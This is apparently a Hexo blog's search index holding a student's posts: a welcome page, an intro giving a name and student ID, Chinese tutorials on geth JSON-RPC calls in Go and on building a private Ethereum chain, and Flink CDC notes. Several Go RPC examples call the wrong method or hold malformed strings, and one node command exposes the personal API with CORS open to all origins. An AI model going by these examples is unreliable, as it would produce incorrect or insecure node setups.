<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Hello World</title>
    <url>/2024/03/23/hello-world/</url>
    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<h2><span id="quick-start">Quick Start</span></h2><h3><span id="create-a-new-post">Create a new post</span></h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
<h3><span id="run-server">Run server</span></h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
<h3><span id="generate-static-files">Generate static files</span></h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
<h3><span id="deploy-to-remote-sites">Deploy to remote sites</span></h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
]]></content>
      <categories>
        <category>startup</category>
      </categories>
  </entry>
  <entry>
    <title>My First Post</title>
    <url>/2024/03/23/My-First-Post/</url>
    <content><![CDATA[<h2><span id="start-my-blogging-journey">Start My Blogging Journey</span></h2><p>This is my first post. Although it seems to be essential, I have never done this before.<br>I want to create my own blog, which can show my identity.</p>
<h2><span id="another-reason">Another Reason</span></h2><p>I am publishing this blog post as part of my assignment for the cloud computing course.<br>My name is 黄梓铭 and my ID number is 21311151.</p>
]]></content>
      <categories>
        <category>startup</category>
      </categories>
  </entry>
  <entry>
    <title>Go调用geth JSON RPC接口</title>
    <url>/2024/03/27/Go%E8%B0%83%E7%94%A8geth_JSON_RPC%E6%8E%A5%E5%8F%A3/</url>
    <content><![CDATA[<p>在Go中调用以太坊的格式如下</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">client, _ := rpc.Dial(<span class="string">&quot;http://localhost:8545&quot;</span>)</span><br><span class="line"><span class="keyword">var</span> result <span class="type">bool</span></span><br><span class="line">client.Call(&amp;result ,<span class="string">&quot;net_listening&quot;</span>) </span><br></pre></td></tr></table></figure>

<p>有以下常用接口</p>
<h2><span id="net">net</span></h2><p>1、net_version<br>当前连接网络的ID</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> networkid <span class="type">string</span></span><br><span class="line">client.Call(&amp;networkid,<span class="string">&quot;net_version&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>2、net_listening<br>客户端是否处于监听状态</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> is_listing <span class="type">bool</span></span><br><span class="line">client.Call(&amp;is_listing,<span class="string">&quot;net_listening&quot;</span>)</span><br></pre></td></tr></table></figure>

<h2><span id="eth">eth</span></h2><p>1、eth_accounts<br>返回账户地址数组</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> accounts []<span class="type">string</span></span><br><span class="line">client.Call(&amp;accounts,<span class="string">&quot;eth_accounts&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>2、eth_getBalance<br>需要传入账户地址，返回余额，单位是<em>wei</em><br> “latest” 表示你要查询的是当前链上最新的账户余额</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> balance <span class="type">string</span></span><br><span class="line">client.Call(&amp;balance,<span class="string">&quot;eth_getBalance&quot;</span>,<span class="string">&quot;0x558c90c05d8c4b55a87de03bd601fd76faf50f9b&quot;</span>,<span class="string">&quot;latest&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>3、eth_coinbase<br>获取挖矿账户地址</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> proto_version <span class="type">string</span></span><br><span class="line">client.Call(&amp;proto_version , <span class="string">&quot;eth_protocolVersion&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>4、eth_mining<br>返回客户端是否在挖矿</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> is_mining <span class="type">bool</span></span><br><span class="line">client.Call(&amp;is_mining,<span class="string">&quot;eth_mining&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>5、eth_getTransactionCount<br>返回指定地址发生的交易数量</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> transactionCount <span class="type">string</span></span><br><span class="line">client.Call(&amp;transactionCount,<span class="string">&quot;eth_getBalance&quot;</span>,<span class="string">&quot;0x72w12d05d8c4b55a87de03bd601fd76faf50f9b&quot;</span>,<span class="string">&quot;latest&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>6、eth_blockNumber<br>获取当前块编号</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> blockNum <span class="type">string</span></span><br><span class="line">client.Call(&amp;blockNum ,<span class="string">&quot;eth_blockNumber&quot;</span>)</span><br></pre></td></tr></table></figure>

<h2><span id="personal">personal</span></h2><p>1、personal_listAccounts<br>获取该节点下的所有账户</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> accounts []<span class="type">string</span></span><br><span class="line">client.Call(&amp;accounts,<span class="string">&quot;personal_listAccounts&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>2.personal_newAccount<br>创建用户，需要将密码作为参数传入</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> newAccount <span class="type">string</span></span><br><span class="line">client.Call(&amp;newAccount, <span class="string">&quot;personal_newAccount&quot;</span>, <span class="string">&quot;12345678&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>3.personal_lockAccount<br>锁定指定账户，需要将地址作为参数传入</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> is_lock <span class="type">bool</span></span><br><span class="line">client.Call(&amp;is_lock, <span class="string">&quot;personal_lockAccount&quot;</span>, <span class="string">&quot;账户地址&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>4.personal_unlockAccount<br>解锁指定账户,有些操作必须解锁账户才可以操作</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> is_unlock <span class="type">bool</span></span><br><span class="line">client.Call(&amp;is_unlock, <span class="string">&quot;personal_lockAccount&quot;</span>, <span class="string">&quot;账户地址&quot;</span>,<span class="string">&quot;账户密码&quot;</span>)</span><br></pre></td></tr></table></figure>

<h2><span id="db">db</span></h2><p>1.db_putString<br>在本地数据库中存入字符串</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> is_ok <span class="type">bool</span></span><br><span class="line">client.Call(&amp;is_ok, <span class="string">&quot;db_putString&quot;</span>, <span class="string">&quot;db_name&quot;</span>,<span class="string">&quot;key&quot;</span>,<span class="string">&quot;&quot;</span>value<span class="string">&quot;)</span></span><br></pre></td></tr></table></figure>

<p>2.db_getString<br>从本地数据库读取字符串</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> val <span class="type">string</span></span><br><span class="line">client.Call(&amp;val, <span class="string">&quot;db_getString&quot;</span>, <span class="string">&quot;db_name&quot;</span>,<span class="string">&quot;key&quot;</span>)</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>科研</category>
      </categories>
  </entry>
  <entry>
    <title>搭建以太坊私链</title>
    <url>/2024/03/26/%E6%90%AD%E5%BB%BA%E4%BB%A5%E5%A4%AA%E5%9D%8A%E7%A7%81%E9%93%BE/</url>
    <content><![CDATA[<p>这里的命令以 Linux 系统为准，但是在 Windows 系统下也是基本相同的</p>
<h2><span id="配置go环境">配置Go环境</span></h2><p>1、首先切换到管理员身份</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo -s</span><br></pre></td></tr></table></figure>

<p>2、下载官⽅的 go 语⾔编译器压缩包</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget https://go.dev/dl/go1.21.3.linux-amd64.tar.gz</span><br></pre></td></tr></table></figure>

<p>3、解压缩刚下载的新版本并放置到合适的位置</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tar -C /usr/local -xzf go1.21.3.linux-amd64.tar.gz</span><br><span class="line">（如果有旧版本，先输入 `rm -rf /usr/local/go` 移除）</span><br></pre></td></tr></table></figure>

<p>4、设定环境变量</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">export PATH=$PATH:/usr/local/go/bin</span><br></pre></td></tr></table></figure>
<p>试试看是否正常（应该会看到版本号）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">go version</span><br></pre></td></tr></table></figure>

<h2><span id="构建geth">构建geth</span></h2><p>1、下载git</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt install git</span><br></pre></td></tr></table></figure>

<p>2、克隆以太坊源码<br>这一步很可能连不上github，没什么解决方法，多试</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/ethereum/go-ethereum.git</span><br></pre></td></tr></table></figure>

<p>3、进入ethereum所在文件夹<br>24-04-09更新: 现在直接克隆以太坊仓库下载的 geth 版本是 1.14.0-unstable，所以在运行链的时候就会出现以下报错，应该要先切换到 1.13版本</p>
<img data-src="/2024/03/26/%E6%90%AD%E5%BB%BA%E4%BB%A5%E5%A4%AA%E5%9D%8A%E7%A7%81%E9%93%BE/use_fatal.png" class>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd go-ethereum</span><br><span class="line">git checkout release/1.13</span><br><span class="line">git pull</span><br></pre></td></tr></table></figure>

<p>4、编译geth</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">make geth</span><br></pre></td></tr></table></figure>
<p>如果发现下载很慢，可以终止掉，设置代理</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">export GOPROXY=https://goproxy.io,direct</span><br></pre></td></tr></table></figure>
<p>下载完成，应该可以看到以下画面</p>
<img data-src="/2024/03/26/%E6%90%AD%E5%BB%BA%E4%BB%A5%E5%A4%AA%E5%9D%8A%E7%A7%81%E9%93%BE/%E4%B8%8B%E8%BD%BD%E5%AE%8C%E6%88%90.png" class>

<p>5、进⼊⽬录</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd build/bin</span><br></pre></td></tr></table></figure>

<p>6、启动主程序，连接主⽹并同步</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./geth</span><br></pre></td></tr></table></figure>

<p>7、配置环境变量</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nano ~/.bashrc</span><br></pre></td></tr></table></figure>
<p>在该文件最后添加以下语句，要注意替换成自己主机的geth所在路径 (前面的~也要修改)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">export PATH=$PATH:~/Desktop/go-ethereum/build/bin</span><br></pre></td></tr></table></figure>
<p>退出后输入以下语句让更改生效，并检测是否配置成功</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">source ~/.bashrc</span><br><span class="line">geth version</span><br></pre></td></tr></table></figure>

<h2><span id="搭建私链">搭建私链</span></h2><p>1、创造配置文件<br>在不同于以太坊源码的文件路径下创一个文件夹和.json文件，命名为genesis.json，可以在桌面创建</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 注意要记得切换到管理员模式，才能创建文件夹</span><br><span class="line">sudo -s</span><br><span class="line">mkdir ./project</span><br><span class="line">mkdir ./project/MyChain</span><br><span class="line">vim ./project/MyChain/genesis.json</span><br><span class="line">// 修改完输入:wq退出vim</span><br></pre></td></tr></table></figure>
<p>在这个 json 文件下，配置这个私链的参数<br>这里使用的共识机制是 <a href="https://geth.ethereum.org/docs/tools/clef/clique-signing">Clique</a>，</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;config&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;chainId&quot;</span><span class="punctuation">:</span> <span class="number">12345</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;homesteadBlock&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;eip150Block&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;eip155Block&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;eip158Block&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;byzantiumBlock&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;constantinopleBlock&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;petersburgBlock&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;istanbulBlock&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;berlinBlock&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;clique&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;period&quot;</span><span class="punctuation">:</span> <span class="number">5</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;epoch&quot;</span><span class="punctuation">:</span> <span class="number">30000</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;difficulty&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;gasLimit&quot;</span><span class="punctuation">:</span> <span class="string">&quot;8000000&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;extradata&quot;</span><span class="punctuation">:</span> <span class="string">&quot;0x0000000000000000000000000000000000000000000000000000000000000000890fb1799fe7fa4b8e01ccf343e088d946fcd5560000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;alloc&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;890fb1799fe7fa4b8e01ccf343e088d946fcd556&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span> <span class="attr">&quot;balance&quot;</span><span class="punctuation">:</span> <span class="string">&quot;300000&quot;</span> <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;14c6ead33b265da463eef7367798ade6aa8e9d12&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span> <span class="attr">&quot;balance&quot;</span><span class="punctuation">:</span> <span class="string">&quot;400000&quot;</span> <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"> <span class="punctuation">&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>2、初始化链</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">geth --datadir ./project/MyChain/ init ./project/MyChain/genesis.json</span><br></pre></td></tr></table></figure>
<p>成功后会出现以下提示 (可能会有 Error 信息，可以忽略)</p>
<img data-src="/2024/03/26/%E6%90%AD%E5%BB%BA%E4%BB%A5%E5%A4%AA%E5%9D%8A%E7%A7%81%E9%93%BE/init.png" class>

<p>假如出现以下报错，可以删除 .&#x2F;project&#x2F;MyChain&#x2F; 目录下新生成的两个文件夹，只保留 .json 文件</p>
<img data-src="/2024/03/26/%E6%90%AD%E5%BB%BA%E4%BB%A5%E5%A4%AA%E5%9D%8A%E7%A7%81%E9%93%BE/init_fatal.png" class>


<p>3、启用链<br>此处启用私链，并且开启RPC接口</p>
<p>24-04-09 更新: 在实验的时候发现，在较新版本的 geth 中，rpc 相关的指令已经不用 –rpcxxx，改为 –http.xxx</p>
<ul>
<li>http：开启 RPC 接口</li>
<li>http.port：指定端口</li>
<li>http.api：开启的RPC API</li>
<li>http.corsdomain：跨域请求，”*”为允许所有来源的跨域请求<br>而且，db 接口也已经被弃用，<br>所以，该命令将变为</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">geth --datadir ./project/MyChain/ --identity &quot;MyETH&quot; --http --http.port 8545  --http.api &quot;eth,net,web3,personal&quot; --http.corsdomain &quot;*&quot; --networkid 12345 console</span><br></pre></td></tr></table></figure>
<p>成功后将出现以下页面</p>
<img data-src="/2024/03/26/%E6%90%AD%E5%BB%BA%E4%BB%A5%E5%A4%AA%E5%9D%8A%E7%A7%81%E9%93%BE/success.png" class>

<hr>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">geth --datadir ./project/MyChain/ --identity &quot;MyETH&quot; --rpc --rpcport 8545  --rpcapi &quot;db,eth,net,web3,personal&quot; --rpccorsdomain &quot;*&quot; --networkid 15 console</span><br></pre></td></tr></table></figure>

<ul>
<li>identity “MyETH”：节点身份标识</li>
<li>rpc：开启 RPC 接口</li>
<li>rpcport：指定端口</li>
<li>rpcapi：开启的RPC API</li>
<li>rpccorsdomain：跨域请求，”*”为允许所有来源的跨域请求</li>
<li>networkid：网络标识符，用于连上私链，networkid是在genesis.json中确定的<br>console：打开geth控制台，用于创建节点和部署智能合约</li>
</ul>
<h2><span id="创建用户并挖矿">创建用户并挖矿</span></h2><p>1、在控制台中创建用户</p>
<p>24-04-09 更新: 实验中发现 personal 已经被弃用，geth 控制台似乎也没有其他方法新创建账户。官方给出的解决方案是使用和 geth 解耦的 <a href="https://geth.ethereum.org/docs/tools/clef/introduction">clef</a> 创建账号<br>个人认为，通过另开一个终端，使用以下命令创建账户会更方便</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">geth account new --datadir ./project/MyChain/</span><br></pre></td></tr></table></figure>

<hr>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">personal.newAccount(&quot;123456&quot;)//括号内是自定义的密码，返回“0x......”为创建出来的用户的地址。之后要用到。</span><br><span class="line">eth.accounts //查询用户</span><br><span class="line">eth.getBalance(eth.accounts[0]) // 通过eth.accounts[0]查询账户余额。若私链上有多个用户，第一个用户为eth.accounts[0]，第二个为eth.accounts[1]。以此类推。</span><br><span class="line">eth.getBalance(&quot;0x......账户地址&quot;) // 通过地址查询出账户余额</span><br></pre></td></tr></table></figure>

<p>2、开始挖矿</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eth.coinbase // 第一种查看矿工的账户地址的方式，该地址默认为第一个账户地址</span><br><span class="line">web3.eth.coinbase // 第二种查看方式矿工地址的方式</span><br><span class="line">miner.setEtherbase(eth.accounts[0]) </span><br><span class="line">//设置矿工用户</span><br></pre></td></tr></table></figure>

<p>3、停止挖矿<br>挖一段时间后，账户就有钱了，可以部署智能合约（部署智能合约需要花钱），可以停止挖矿</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">miner.stop()</span><br><span class="line">eth.getBalance(eth.accounts[0])</span><br><span class="line">//再查账户，发现自己突然有钱了。</span><br></pre></td></tr></table></figure>
<hr>
<p>24-04-15 更新: miner.start() 必须先解锁账户，而 personal.unlockAccount 在较新版本的 geth 已经被弃用，不进行挖矿会导致所有交易都不能上链，包括智能合约的部署</p>
<p>目前的解决方法是，修改私链启动语句，将所有和 HTTP-RPC 相关的参数都删去 (不能与 –unlock 并存)，并添加 –unlock 参数，在启动链的时候就解锁账户，之后的步骤和之前相同</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">geth --datadir ./project/MyChain/ --unlock 0x890fb1799fe7fa4b8e01ccf343e088d946fcd556 console</span><br></pre></td></tr></table></figure>

<p>但是这样会产生新的问题，即无法远程调用 geth 提供的 HTTP-RPC API。目前想到的曲线救国方法是，一部分节点只用于挖矿 (以下称<em>挖矿节点</em>)，一部分节点用于提供 HTTP-RPC API (以下称<em>链接节点</em>)，但还未测试过，不知是否可行。</p>
<hr>
<p>24-04-15 更新: 这种方法似乎是可行的，但是不一定符合工业标准，具体做法是：<br>1、创建新目录</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mkdir ./project/node2</span><br></pre></td></tr></table></figure>

<p>2、用原来的 genesis.json 初始化链</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">geth --datadir ./project/node2 init ./project/MyChain/genesis.json</span><br></pre></td></tr></table></figure>
<p>并把 .&#x2F;project&#x2F;MyChain&#x2F;keystore 复制到 .&#x2F;project&#x2F;node2&#x2F;keystore</p>
<p>3、启用链</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">geth --datadir ./project/node2 --http --http.port 8545 --http.corsdomain &quot;*&quot; --networkid 12345 --port 30305 --authrpc.port 8552 --ipcpath \\.\pipe\geth2.ipc</span><br></pre></td></tr></table></figure>

<p>4、添加节点<br>复制链接节点的enode值，并在挖矿节点所在链控制台中输入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin.addPeer(&quot;enode://94d8388d7e97a8be1ee6005cc2bd81ad2b9f3e6580bec8a1305cac6271c5319b6a7e8273dfc82b0dab9c4c11ab71433f29ca30df3a4e327527a570ef1ed4bc28@127.0.0.1:30305&quot;)</span><br></pre></td></tr></table></figure>
<p>成功后会出现以下界面，可以看到两次 Looking for peers 的 peercount 值发生了改变</p>
<img data-src="/2024/03/26/%E6%90%AD%E5%BB%BA%E4%BB%A5%E5%A4%AA%E5%9D%8A%E7%A7%81%E9%93%BE/peercount_change.png" class>

<p>5、使用 node.js 远程创建交易<br>以下是一个简单的转账交易例子，在任意位置创建文件 tx.js</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title class_">Web3</span> = <span class="built_in">require</span>(<span class="string">&#x27;web3&#x27;</span>).<span class="property">default</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> web3 = <span class="keyword">new</span> <span class="title class_">Web3</span>(<span class="string">&#x27;http://localhost:8545&#x27;</span>);</span><br><span class="line"></span><br><span class="line">(<span class="keyword">async</span> () =&gt; &#123;</span><br><span class="line">    <span class="keyword">const</span> privateKey = <span class="string">&#x27;替换成您的私钥&#x27;</span>; <span class="comment">// 私钥，确保正确和安全地处理</span></span><br><span class="line">    <span class="keyword">var</span> tx = &#123;</span><br><span class="line">        <span class="attr">from</span>: <span class="string">&quot;0x890fb1799fe7fa4b8e01ccf343e088d946fcd556&quot;</span>,</span><br><span class="line">        <span class="attr">to</span>: <span class="string">&quot;0x4c6ead33b265da463eef7367798ade6aa8e9d12&quot;</span>,</span><br><span class="line">        <span class="attr">value</span>: web3.<span class="property">utils</span>.<span class="title function_">toWei</span>(<span class="number">1</span>, <span class="string">&quot;ether&quot;</span>), <span class="comment">// 转账金额，单位为以太</span></span><br><span class="line">        <span class="attr">gas</span>: <span class="number">21000</span>, <span class="comment">// 交易的 gas 限额</span></span><br><span class="line">        <span class="attr">gasPrice</span>: web3.<span class="property">utils</span>.<span class="title function_">toWei</span>(<span class="number">10</span>, <span class="string">&quot;gwei&quot;</span>) <span class="comment">// gas 价格，单位为 wei</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 签名交易</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> signedTx = <span class="keyword">await</span> web3.<span class="property">eth</span>.<span class="property">accounts</span>.<span class="title function_">signTransaction</span>(tx, privateKey);</span><br><span class="line">        <span class="keyword">const</span> receipt = <span class="keyword">await</span> web3.<span class="property">eth</span>.<span class="title function_">sendSignedTransaction</span>(signedTx.<span class="property">rawTransaction</span>);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;交易收据:&#x27;</span>, receipt);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;签名或发送交易出错:&#x27;</span>, err);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure>

<p>在挖矿节点所在链用 miner.start() 等待交易提交上链 (这里作者不确定是否需要在链接节点所在链用 miner.start()，正常来说会因为没有解锁账户而失败，但是似乎要这样做才能使两个节点同步)<br>创建好交易后，就可以使用以下命令提交交易</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">node tx.js</span><br></pre></td></tr></table></figure>
<p>然后同时在两条链都查询账户余额，发现数额相同，说明两条节点成功同步</p>
<h2><span id="部署智能合约">部署智能合约</span></h2><p>参照下一篇文章</p>
<a href="/2024/03/30/%E4%BB%A5%E5%A4%AA%E5%9D%8A%E7%A7%81%E9%93%BE%E9%83%A8%E7%BD%B2%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/" title="以太坊私链部署智能合约">以太坊私链部署智能合约</a>

<!-- 在admin里面可以看到监听的端口号

personal.newAccount() 创建新用户
输入密码，返回值是账户地址

personal.unlockAccount(eth.accounts[0]) 
之后就可以输入密码，解锁账号

miner.start 开始挖矿

geth --datadir ../project/MyChain/ --networkid 15 console 2>output.log
2代表输出，>是重定向

geth --datadir ../project/MyChain/ --networkid 15 --rpc console 2>output.log

可以用开发者模式 -dev -->

]]></content>
      <categories>
        <category>科研</category>
      </categories>
  </entry>
  <entry>
    <title>综合实训调研</title>
    <url>/2024/03/28/%E7%BB%BC%E5%90%88%E5%AE%9E%E8%AE%AD%E8%B0%83%E7%A0%94/</url>
    <content><![CDATA[<p>由于综合实践项目需要用到Flink CDC、Kafka、ElasticSearch、Kibana、Doris，以下是对这些框架&#x2F;技术的调研</p>
<h2><span id="flink-cdc">Flink CDC</span></h2><p><a href="https://nightlies.apache.org/flink/flink-cdc-docs-release-3.0/zh/docs/get-started/introduction/">Flink CDC</a> 是一个基于流的数据集成工具，旨在为用户提供一套功能更加全面的编程接口（API）。</p>
<h3><span id="事件">事件</span></h3><p>事件分为DataChangeEvent、SchemaChangeEvent、Flow of Events</p>
<h4><span id="datachangeevent">DataChangeEvent</span></h4><p><em>DataChangeEvent</em> 描述了源中的数据变更。它由 5 个字段组成：</p>
<ul>
<li>Table ID：事件所属的表 ID</li>
<li>Before：数据的前置图像</li>
<li>After：数据的后置图像</li>
<li>Operation type：变更操作的类型</li>
<li>Meta：变更的元数据</li>
</ul>
<p>操作类型字段预定义了 4 种操作类型：</p>
<ul>
<li>插入（Insert）：新数据条目，before &#x3D; null，after &#x3D; 新数据</li>
<li>删除（Delete）：数据删除，before &#x3D; 被删除的数据，after &#x3D; null</li>
<li>更新（Update）：已存在数据的更新，before &#x3D; 变更前的数据，after &#x3D; 变更后的数据</li>
<li>替换（Replace）</li>
</ul>
<h4><span id="schemachangeevent">SchemaChangeEvent</span></h4><p><em>SchemaChangeEvent</em> 描述了外部系统中表结构的更改</p>
<ul>
<li>AddColumnEvent：表中的新列</li>
<li>AlterColumnTypeEvent：列类型的更改</li>
<li>CreateTableEvent：创建新表。也用于描述预发出的 DataChangeEvent 的模式</li>
<li>DropColumnEvent：删除列</li>
<li>RenameColumnEvent：列名更改</li>
</ul>
<h4><span id="事件流">事件流</span></h4><p>如果一个表对框架是新的，则在任何 DataChangeEvent 之前必须发出 CreateTableEvent；如果表的 schema 发生变化，则必须在任何 DataChangeEvent 之前发出 SchemaChangeEvent。</p>
<img data-src="/2024/03/28/%E7%BB%BC%E5%90%88%E5%AE%9E%E8%AE%AD%E8%B0%83%E7%A0%94/flow-of-events.png" class title="事件流图">

<h3><span id="如何使用-flink-cdc">如何使用 Flink CDC</span></h3><p><a href="https://nightlies.apache.org/flink/flink-cdc-docs-release-3.0/zh/docs/get-started/quickstart/mysql-to-doris/">MySQL 同步到 Doris</a><br>Flink CDC 提供了基于 YAML 格式的用户 API，更适合于数据集成场景。以下是一个 YAML 文件的示例，它定义了一个数据管道(Pipeline)，该Pipeline从 MySQL 捕获实时变更，并将它们同步到 Apache Doris：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">source:</span><br><span class="line">  type: mysql</span><br><span class="line">  hostname: localhost</span><br><span class="line">  port: 3306</span><br><span class="line">  username: root</span><br><span class="line">  password: 123456</span><br><span class="line">  tables: app_db.\.*</span><br><span class="line">  server-id: 5400-5404</span><br><span class="line">  server-time-zone: UTC</span><br><span class="line"></span><br><span class="line">sink:</span><br><span class="line">  type: doris</span><br><span class="line">  fenodes: 127.0.0.1:8030</span><br><span class="line">  username: root</span><br><span class="line">  password: &quot;&quot;</span><br><span class="line">  table.create.properties.light_schema_change: true</span><br><span class="line">  table.create.properties.replication_num: 1</span><br><span class="line"></span><br><span class="line">pipeline:</span><br><span class="line">  name: Sync MySQL Database to Doris</span><br><span class="line">  parallelism: 2</span><br></pre></td></tr></table></figure>
